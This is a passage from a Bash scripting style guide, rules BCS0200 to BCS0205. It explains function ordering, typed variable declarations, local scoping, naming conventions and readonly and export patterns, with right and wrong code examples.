  validate_input "$1"
  # ...
}

# ✗ Wrong - random/alphabetical organization ignoring dependencies
cleanup() { ... }
build() { ... }
check_deps() { ... }
main() { ... }

# ✓ Correct - dependency-ordered organization
check_deps() { ... }  # No dependencies
build() { check_deps; ... }  # Depends on check_deps
cleanup() { ... }  # No dependencies
main() { build; cleanup; }  # Depends on all

# ✗ Wrong - messaging functions scattered throughout
info() { ... }
build() { ... }
warn() { ... }
deploy() { ... }
error() { ... }

# ✓ Correct - all messaging together at top
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

build() { ... }
deploy() { ... }

# ✗ Wrong - circular dependencies (A calls B, B calls A)
function_a() {
  # ...
  function_b  # Calls B
}

function_b() {
  # ...
  function_a  # Calls A - circular dependency!
}

# ✓ Correct - extract common logic to lower-level function
common_logic() {
  # Shared code
}

function_a() {
  common_logic
  # A-specific code
}

function_b() {
  common_logic
  # B-specific code
}
```

**Guidelines for within-layer ordering:**

**1. Within Layer 1 (Messaging):**
Order by severity/importance:
- `_msg()` (core utility)
- `info()`
- `success()`
- `debug()`/`vecho()`
- `warn()`
- `error()`
- `die()` (terminates script)

**2. Within Layer 3 (Helpers):**
Order alphabetically or by frequency of use:
- Most commonly used first
- Or alphabetically for easy lookup

**3. Within Layer 4 (Validation):**
Order by execution sequence:
- Functions called early in script first
- Or alphabetically

**4. Within Layer 5 (Business Logic):**
Order by logical workflow:
- Functions representing sequential steps in order
- Or group related operations together

**Edge cases and special considerations:**

**1. Circular dependencies:**

```bash
# Problem: Function A needs B, but B needs A

# Solution 1: Extract common logic to lower layer
shared_validation() {
  # Common validation used by both
}

function_a() {
  shared_validation
  # A-specific logic
}

function_b() {
  shared_validation
  # B-specific logic
}

# Solution 2: Restructure to eliminate circular dependency
# Often indicates design issue - rethink function responsibilities
```

**2. Optional functions (sourced libraries):**

```bash
# When sourcing libraries, they may define functions
# Place source statements after your messaging layer

# Messaging functions
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

# Source library (may define additional utilities)
source "$SCRIPT_DIR/lib/common.sh"

# Your utilities
# (Can now use both your messaging AND library functions)
validate_email() { ... }
```

**3. Private functions:**

```bash
# Functions prefixed with _ are private/internal
# Place in same layer as public functions that use them

# Layer 1: Messaging
_msg() { ... }  # Private core utility
info() { >&2 _msg "$@"; }  # Public wrapper

# Layer 3: Utilities
_internal_parser() { ... }  # Private helper
parse_config() { _internal_parser "$@"; }  # Public interface
```

**Summary:**

- **Always organize bottom-up**: messaging → utilities → validation → business logic → orchestration → main()
- **Group functions** with section comments (e.g., `# Layer 3: Utilities`)
- **Dependencies flow downward**: higher functions call lower functions, never upward
- **Within each layer**: order alphabetically or by logical sequence
- **main() is always last** before invocation
- **Avoid circular dependencies**: extract common logic to lower layer
- **Use section comments** to visually separate layers

**Key principle:** Bottom-up organization mirrors how programmers think: understand primitives first, then compositions. This pattern eliminates forward reference issues and makes scripts immediately understandable to readers.


---


**Rule: BCS0200**

# Variable Declarations & Constants

This section establishes explicit variable declaration practices with type hints for clarity and safety. It covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), variable scoping rules (global vs local), naming conventions (UPPER_CASE for constants, lower_case for variables), readonly patterns for constants (both individual declarations and the group pattern), boolean flag implementations using integers, and derived variable patterns where values are computed from other variables. These practices ensure predictable variable behavior and prevent common shell scripting errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations. Explicit typing prevents bugs, improves readability, and enables bash's built-in type checking.**

**Rationale:**

- **Type Safety**: Integer declarations (`-i`) automatically enforce numeric operations and catch non-numeric assignments
- **Intent Documentation**: Explicit types serve as inline documentation showing how the variable will be used
- **Array Safety**: Array declarations prevent accidental scalar assignment that would break array operations
- **Scope Control**: `declare` and `local` provide precise variable scoping (global vs function-local)
- **Performance**: Type-specific operations are faster than string-based operations
- **Error Prevention**: Type mismatches are caught early rather than causing subtle bugs later

**All declaration types:**

**1. Integer variables (`declare -i`)**

**Purpose**: Variables that will hold only numeric values and participate in arithmetic operations.

```bash
# Declare integer variable
declare -i count=0
declare -i exit_code=1
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"

# Type enforcement
count='abc'  # Evaluates to 0 (non-numeric becomes 0)
echo "$count"  # Output: 0
```

**When to use:**
- Counters, loop indices
- Exit codes
- Port numbers
- Numeric flags (though consider using `declare -i FLAG=0` or `declare -i FLAG=1`)
- Any variable used in arithmetic operations

**Benefits:**
- Automatic arithmetic evaluation (no need for `$(())` in some contexts)
- Type checking (non-numeric values become 0)
- Clear intent that variable holds numbers

> **See Also:** BCS0705 for using declared integers in arithmetic comparisons with `(())` instead of `[[ ... -eq ... ]]`

**2. String variables (`declare --`, `local --`)**

**Purpose**: Variables that hold text strings. The `--` separator prevents option injection.

```bash
# Declare string variables
declare -- filename=data.txt
declare -- user_input=''
declare -- config_path=/etc/app/config.conf

# ` --` prevents option injection if variable name starts with -
declare -- var_name='-weird'  # Without --, this would be interpreted as option
```

**When to use:**
- File paths
- User input
- Configuration values
- Any text data
- Default choice for most variables

**Benefits:**
- Explicit intent that variable holds text
- `--` separator prevents option injection bugs
- Clear distinction from integers and arrays

**3. Indexed arrays (`declare -a`)**

**Purpose**: Ordered lists indexed by integers (0, 1, 2, ...).

```bash
# Declare indexed array
declare -a files=()
declare -a args=(one two three)
declare -a paths

# Add elements
files+=('file1.txt')
files+=('file2.txt')

# Access elements
echo "${files[0]}"  # file1.txt
echo "${files[@]}"  # All elements
echo "${#files[@]}"  # Count: 2

# Iterate
for file in "${files[@]}"; do
  process "$file"
done
```

**When to use:**
- Lists of items (files, arguments, options)
- Command arrays for safe execution
- Any sequential collection
- Anytime you need to iterate over multiple values

**Benefits:**
- Safe word splitting (quoted expansion preserves spaces)
- Clear intent that variable is a list
- Prevents accidental scalar assignment

**4. Associative arrays (`declare -A`)**

**Purpose**: Key-value maps (hash tables, dictionaries).

```bash
# Declare associative array
declare -A config=(
  [app_name]=myapp
  [app_port]=8080
  [app_host]=localhost
)

declare -A user_data=()

# Add/modify elements
user_data[name]=Alice
user_data[email]='alice@example.com'

# Access elements
echo "${config[app_name]}"  # myapp
echo "${!config[@]}"  # All keys
echo "${config[@]}"  # All values

# Check if key exists
if [[ -v "config[app_port]" ]]; then
  echo "Port configured: ${config[app_port]}"
fi

# Iterate over keys
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
```

**When to use:**
- Configuration data (key-value pairs)
- Dynamic function dispatch
- Caching/memoization
- Any data organized by named keys rather than numeric indices

**Benefits:**
- Clear key-value relationship
- Fast lookups by key
- Replaces need for multiple scalar variables

**5. Read-only constants (`readonly --`)**

**Purpose**: Variables that should never change after initialization.

```bash
# Declare constants
readonly -- SCRIPT_VERSION=1.0.0
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=(start stop restart status)

# Attempt to modify (will fail)
SCRIPT_VERSION=2.0.0  # bash: VERSION: readonly variable

# Verify readonly status
readonly -p | grep SCRIPT_VERSION
# Output: declare -r VERSION="1.0.0"
```

**When to use:**
- VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- Configuration values that shouldn't change
- Magic numbers/strings
- Validated user input (after validation, make readonly)

**Benefits:**
- Prevents accidental modification
- Self-documenting (signals immutability)
- Defensive programming

**6. Local variables in functions (`local --`)**

**Purpose**: Variables scoped to function, not visible outside.

**MANDATORY: Always use `--` separator with `local` declarations**, just like with `declare` and `readonly`. This prevents option injection if variable name or value starts with `-`.

```bash
# ✓ CORRECT - always use `--` separator
process_file() {
  local -- filename=$1
  local -i line_count
  local -a lines

  # These variables don't exist outside this function
  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"

  echo "Processed $line_count lines"
}

# ✗ WRONG - missing `--` separator
process_file_bad() {
  local filename=$1    # If $1 is "-n", behavior changes!
  local name value     # Should be: local -- name value
}
```

**When to use:**
- ALL function parameters
- ALL temporary variables in functions
- Variables that shouldn't leak to global scope

**Benefits:**
- Prevents global namespace pollution
- Avoids variable collision between functions
- Clear scoping (function-local vs global)
- `--` separator prevents option injection bugs

**Combining type and scope:**

```bash
# Global integer
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir=$1
  local -i file_count=0
  local -a files

  # Local integer variable
  file_count=0

  # Local array
  files=("$dir"/*)

  for file in "${files[@]}"; do
    [[ -f "$file" ]] && file_count+=1 ||:
  done

  echo "$file_count"
}

# Global array
declare -a PROCESSED_FILES=()

# Global associative array
declare -A FILE_STATUS=()

# Global readonly
readonly -- CONFIG_FILE=config.conf
```

**Complete example showing all types:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Integer variables
declare -i VERBOSE=0
declare -i ERROR_COUNT=0
declare -i MAX_RETRIES=3

# String variables
declare -- LOG_FILE=/var/log/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/config.conf

# Indexed arrays
declare -a FILES_TO_PROCESS=()
declare -a FAILED_FILES=()

# Associative arrays
declare -A CONFIG=(
  [timeout]='30'
  [retries]='3'
  [verbose]='false'
)

declare -A FILE_CHECKSUMS=()

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Utility Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ============================================================================
# Business Logic Functions
# ============================================================================

# Function with local typed variables
process_file() {
  local -- input_file=$1
  local -i attempt=0
  local -i success=0
  local -- checksum

  while ((attempt < MAX_RETRIES && !success)); do
    attempt+=1

    info "Processing $input_file (attempt $attempt)"

    if process_command "$input_file"; then
      success=1
      checksum=$(sha256sum "$input_file" | cut -d' ' -f1)
      FILE_CHECKSUMS["$input_file"]="$checksum"
      info "Success: $input_file ($checksum)"
    else
      warn "Failed: $input_file (attempt $attempt/$MAX_RETRIES)"
      ERROR_COUNT+=1
    fi
  done

  if ((success)); then
    return 0
  else
    FAILED_FILES+=("$input_file")
    return 1
  fi
}

main() {
  # Load files into array
  FILES_TO_PROCESS=("$SCRIPT_DIR"/data/*.txt)

  # Process each file
  local -- file
  for file in "${FILES_TO_PROCESS[@]}"; do
    process_file "$file"
  done

  # Report results
  info "Processed: ${#FILES_TO_PROCESS[@]} files"
  info "Errors: $ERROR_COUNT"
  info "Failed: ${#FAILED_FILES[@]} files"

  # Show checksums
  local -- filename
  for filename in "${!FILE_CHECKSUMS[@]}"; do
    info "Checksum: $filename = ${FILE_CHECKSUMS[$filename]}"
  done

  ((ERROR_COUNT == 0))  # Exit code: 0 if no errors, 1 if errors
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no type declaration (intent unclear)
count=0
files=()

# ✓ Correct - explicit type declarations
declare -i count=0
declare -a files=()

# ✗ Wrong - using strings for numeric operations
max_retries='3'
attempts='0'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# ✓ Correct - use integers for numeric operations
declare -i max_retries=3
declare -i attempts=0
if ((attempts < max_retries)); then  # Numeric comparison

# ✗ Wrong - forgetting -A for associative arrays
declare CONFIG  # Creates scalar, not associative array
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# ✓ Correct - explicit associative array declaration
declare -A CONFIG=()
CONFIG[key]='value'

# ✗ Wrong - global variables in functions
process_data() {
  temp_var=$1  # Global variable leak!
  result=$(process "$temp_var")
}

# ✓ Correct - local variables in functions
process_data() {
  local -- temp_var=$1
  local -- result
  result=$(process "$temp_var")
}

# ✗ Wrong - forgetting -- separator
declare filename='-weird'  # Interpreted as option!

# ✓ Correct - use -- separator
declare -- filename='-weird'

# ✗ Wrong - scalar assignment to array variable
declare -a files=()
files=file.txt  # Overwrites array with scalar!

# ✓ Correct - array assignment
declare -a files=()
files=(file.txt)  # Array with one element
# Or
files+=(file.txt)  # Append to array

# ✗ Wrong - using readonly without type
readonly VAR='value'  # Type unclear

# ✓ Correct - combine readonly with type
readonly -- VAR='value'
readonly -i COUNT=10
readonly -a ACTIONS=(start stop)
```

**Edge cases:**

**1. Integer overflow:**

```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
big_number+=1
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
```

**2. Associative array requires Bash 4.0+:**

```bash
# Check bash version
if ((BASH_VERSINFO[0] < 4)); then
  die 1 'Associative arrays require Bash 4.0+'
fi

declare -A config=()
```

**3. Array assignment syntax:**

```bash
# All of these create arrays correctly:
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization

# This creates scalar, not array:
declare -a arr4='string'     # arr4 is string 'string', not array!

# Correct array with single element:
declare -a arr5=('string')   # Array with one element
```

**4. Local arrays in functions:**

```bash
process_list() {
  # Both type and scope modifiers
  local -a files=()
  local -A status=()

  # Use arrays locally
  files=("$@")
  status[total]="${#files[@]}"
}
```

**5. Nameref variables (Bash 4.3+):**

```bash
# Pass array by reference
modify_array() {
  local -n arr_ref=$1  # Nameref to array

  arr_ref+=('new element')
}

declare -a my_array=('a' 'b')
modify_array my_array  # Pass name, not value
echo "${my_array[@]}"  # Output: a b new element
```

**Summary:**

- **Use `declare -i`** for integer variables (counters, exit codes, ports)
- **Use `declare --`** for string variables (paths, text, user input)
- **Use `declare -a`** for indexed arrays (lists, sequences)
- **Use `declare -A`** for associative arrays (key-value maps, configs)
- **Use `readonly --`** for constants that shouldn't change
- **Use `local`** for ALL variables in functions (prevent global leaks)
- **Combine modifiers** when needed: `local -i`, `local -a`, `readonly -A`
- **Always use `--`** separator to prevent option injection

**Key principle:** Explicit type declarations serve as inline documentation and enable type checking. When you declare `declare -i count=0`, you're telling both Bash and future readers: "This variable holds an integer and will be used in arithmetic operations."


---


**Rule: BCS0202**

## Variable Scoping
Always declare function-specific variables as `local` to prevent namespace pollution and unexpected side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
  # ...
}
```

**Rationale:** Without `local`, function variables become global and can:
1. **Overwrite global variables** with the same name
2. **Persist after function returns**, causing unexpected behavior
3. **Interfere with recursive function calls**

**Anti-pattern example:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file=$1  # Overwrites any global $file variable!
  # ...
}

# ✓ Correct - local declaration
process_file() {
  local -- file=$1  # Scoped to this function only
  # ...
}
```

**Common gotcha - recursive functions:**
```bash
# Without local, recursive functions break
count_files() {
  total=0  # ✗ Global! Each recursive call resets it
  for file in "$1"/*; do
    total+=1
  done
  echo "$total"
}

# Correct version
count_files() {
  local -i total=0  # ✓ Each invocation gets its own total
  for file in "$1"/*; do
    total+=1
  done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

Follow these naming conventions to maintain consistency and avoid conflicts with shell built-ins.

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile=/etc/myapp.conf

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- **UPPER_CASE for globals/constants**: Immediately visible as script-wide scope, matches shell conventions
- **lower_case for locals**: Distinguishes from globals, prevents accidental shadowing
- **Underscore prefix for private functions**: Signals "internal use only", prevents namespace conflicts
- **Avoid lowercase single-letter names**: Reserved for shell (`a`, `b`, `n`, etc.)
- **Avoid all-caps shell variables**: Don't use `PATH`, `HOME`, `USER`, etc. as your variable names


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_RETRIES=3
declare -r CONFIG_DIR=/etc/myapp

# Group readonly declarations; usually prefer declare -r
VERSION=1.0.0
AUTHOR='John Doe'
LICENSE=GPL-3
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID=PROD
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL=DEBUG
export TEMP_DIR=/tmp/myapp
```

**Rationale:**

**When to use `readonly`:**
- **Script metadata** that never changes (VERSION, AUTHOR, LICENSE)
- **Configuration paths** determined at startup (CONFIG_DIR, DATA_DIR)
- **Constants derived from calculations** that shouldn't be modified later
- **Purpose**: Prevent accidental modification, signal intent to readers

**When to use `declare -x` / `export`:**
- **Values needed by child processes** (commands executed by script)
- **Environment configuration** for tools (DATABASE_URL, API_KEY)
- **Settings inherited by subshells** (LOG_LEVEL, DEBUG_MODE)
- **Purpose**: Make variable available in subprocess environment

**Key differences:**

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | ✓ Yes | ✗ No |
| Available in subprocesses | ✗ No | ✓ Yes |
| Can be changed later | ✗ Never | ✓ Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV=production
declare -rix MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

# ✓ Correct - only make it readonly
readonly -- MAX_RETRIES=3

# ✗ Wrong - not making true constants readonly
CONFIG_FILE=/etc/app.conf  # Could be accidentally modified later

# ✓ Correct - protect against modification
readonly -- CONFIG_FILE=/etc/app.conf

# ✗ Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME"/output  # Can't be overridden by user!

# ✓ Correct - allow override, then make readonly
OUTPUT_DIR=${OUTPUT_DIR:-"$HOME"/output}
readonly -- OUTPUT_DIR
```

**Example combining both:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
declare -r VERSION=2.1.0
declare -ri MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL=${LOG_LEVEL:-INFO}
declare -x TEMP_DIR=${TMPDIR:-/tmp}

# Combined: readonly + exported
declare -rx BUILD_ENV=production

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**When declaring multiple readonly variables, always declare them first with their values, then make them all readonly in a single statement. This pattern improves readability, prevents assignment errors, and makes the immutability contract explicit and visible.**

**Rationale:**

- **Prevents Assignment Errors**: Cannot assign value to an already-readonly variable (Can use #shellcheck disable for simple assignments)
- **Visual Grouping**: Related constants are visually grouped together as a logical unit
- **Clear Intent**: Single readonly statement makes immutability contract obvious
- **Maintainability**: Easy to add/remove variables from the readonly group
- **Readability**: Separates initialization phase (values) from protection phase (readonly)
- **Error Detection**: If any variable hasn't been initialized before readonly, script fails explicitly

**Three-Step Progressive Readonly Workflow:**

This is the standard pattern for variables that can only be finalized after argument parsing or runtime configuration:

**Step 1 - Declare with defaults:**
```bash
declare -i VERBOSE=0 DRY_RUN=0
declare -- OUTPUT_FILE='' PREFIX=/usr/local
```

**Step 2 - Parse and modify in main():**
```bash
main() {
  while (($#)); do case $1 in
    -v) VERBOSE+=1 ;;
    -n) DRY_RUN=1 ;;
    --output) noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    --prefix) noarg "$@"; shift; PREFIX=$1 ;;
  esac; shift; done

  # Step 3 - Make readonly AFTER parsing complete
  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX

  # Now safe to use - all readonly
  ((VERBOSE)) && info "Using prefix: $PREFIX" ||:
}
```

**Rationale for three-step pattern:**
- Variables must be **mutable during parsing** (Step 2)
- Making readonly **too early** prevents modification
- Making readonly **after parsing** locks in final values (Step 3)
- Prevents accidental modification throughout rest of script

**Exception - Script Metadata:**

**Note:** As of BCS v1.0.1, the **preferred pattern** for script metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) is `declare -r` for immediate readonly declaration. While readonly-after-group remains valid for metadata, `declare -r` is now recommended (see BCS0103). All other variable groups (colors, paths, configuration) continue to use the readonly-after-group pattern described below.

The important principle is that script metadata variables must be readonly. The specific mechanism (readonly-after-group vs declare -r) is less critical than ensuring immutability is achieved.

**Standard pattern (for non-metadata variables):**

```bash
# Script metadata (exception - uses declare -r, see BCS0103)
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Why readonly-after-group pattern works:**

```bash
# For non-metadata variable groups (paths, colors, config):

# Phase 1: Initialize all variables
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
LIB_DIR="$PREFIX"/lib

# Phase 2: Protect entire group
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR

# Now all four variables are immutable
```

**What groups belong together:**

**1. Script metadata group (exception - uses declare -r, see BCS0103):**
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**2. Color definitions group:**
```bash
# Terminal colors (conditional)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi
```

**3. Path constants group:**
```bash
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share/myapp
LIB_DIR="$PREFIX"/lib/myapp
ETC_DIR="$PREFIX"/etc/myapp
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR
```

**4. Configuration defaults group:**
```bash
DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
DEFAULT_LOG_LEVEL=info
DEFAULT_PORT=8080
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES DEFAULT_LOG_LEVEL DEFAULT_PORT
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata (Group 1 - exception: uses declare -r, see BCS0103)
# ============================================================================

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Color Definitions (Group 2)
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Installation Paths (Group 3)
# ============================================================================

PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share/"$SCRIPT_NAME"
readonly -- PREFIX BIN_DIR SHARE_DIR

# ============================================================================
# Configuration (Group 4)
# ============================================================================

DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
MAX_FILE_SIZE=104857600  # 100MB
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES MAX_FILE_SIZE

# ============================================================================
# Mutable Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i ERROR_COUNT=0

# These will be made readonly after argument parsing
declare -- LOG_FILE=''
declare -- CONFIG_FILE=''

# Main logic
main() {
  # Parse arguments...
  # After parsing, make parsed values readonly
  [[ -z "$LOG_FILE" ]] || readonly -- LOG_FILE
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE

  info "Starting $SCRIPT_NAME $VERSION"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# For script metadata (see BCS0103):
# ▲ Valid but not preferred - readonly-after-group for metadata
VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Preferred - declare -r for script metadata (BCS0103)
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Note: Both patterns above are valid. The declare -r pattern is preferred
# as of BCS v1.0.1 for its conciseness and immediate immutability.

# For non-metadata variable groups:
# ✗ Wrong - making readonly before all values are set
PREFIX=/usr/local
readonly -- PREFIX  # Premature!
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share

# If BIN_DIR assignment fails, PREFIX is readonly but
# SHARE_DIR is not, creating inconsistent protection

# ✓ Correct - all values set, then all readonly
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

# ✗ Wrong - forgetting -- separator
readonly PREFIX BIN_DIR  # Risky if variable name starts with -

# ✓ Correct - always use -- separator
readonly -- PREFIX BIN_DIR

# ✗ Wrong - mixing related and unrelated variables
CONFIG_FILE=config.conf
VERBOSE=1
PREFIX=/usr/local
readonly -- CONFIG_FILE VERBOSE PREFIX
# These don't form a logical group!

# ✓ Correct - group logically related variables
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

CONFIG_FILE=config.conf
LOG_FILE=app.log
readonly -- CONFIG_FILE LOG_FILE

# ✗ Wrong - readonly inside conditional (hard to verify)
if [[ -f config.conf ]]; then
  CONFIG_FILE=config.conf
  readonly -- CONFIG_FILE
fi
# CONFIG_FILE might not be readonly if condition is false!

# ✓ Correct - initialize with default, then readonly
CONFIG_FILE=${CONFIG_FILE:-config.conf}
readonly -- CONFIG_FILE
# Always readonly, value might vary
```

**Edge case: Derived variables:**

When variables depend on each other, initialize in dependency order:

```bash
# Base configuration
PREFIX=${PREFIX:-/usr/local}

# Derived paths (depend on PREFIX)
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
LIB_DIR="$PREFIX"/lib

# Make all readonly together
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR

# If you need to recalculate derived values:
# Don't make them readonly until after all calculations
```

**Edge case: Conditional initialization:**

```bash
# Color constants depend on terminal detection
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  NC=''
fi

# Either way, same variables are defined
# Safe to make readonly after conditional
readonly -- RED GREEN NC
```

**Edge case: Arrays in readonly groups:**

```bash
# Can make arrays readonly too
declare -a REQUIRED_COMMANDS=(git make tar)
declare -a OPTIONAL_COMMANDS=(md2ansi pandoc)

# Make both arrays readonly
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS

# Or use -- if not specifying type
readonly -- REQUIRED_COMMANDS OPTIONAL_COMMANDS
```

**Edge case: Delayed readonly (after argument parsing):**

Some variables can only be made readonly after argument parsing:

```bash
